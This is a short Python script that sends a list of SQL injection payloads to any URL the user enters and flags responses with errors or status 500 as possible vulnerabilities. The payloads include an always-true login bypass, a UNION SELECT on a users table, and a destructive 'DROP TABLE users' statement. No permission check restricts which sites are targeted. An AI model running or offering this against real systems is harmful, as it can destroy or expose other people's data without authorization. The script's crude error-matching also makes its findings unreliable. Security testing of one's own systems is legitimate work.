import requests

def test_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='2",
        "'; DROP TABLE users; --",
        "'; SELECT * FROM users WHERE username = '' UNION SELECT null, null, null --"
    ]

    for payload in payloads:
        response = requests.get(url + payload)
        
        if "error" in response.text.lower() or response.status_code == 500:
            print(f"Possible SQL injection vulnerability detected with payload: {payload}")
        else:
            print(f"No vulnerability detected with payload: {payload}")

def main():
    url = input("Enter the URL to test for SQL injection: ")
    test_sql_injection(url)

if __name__ == "__main__":
    main()
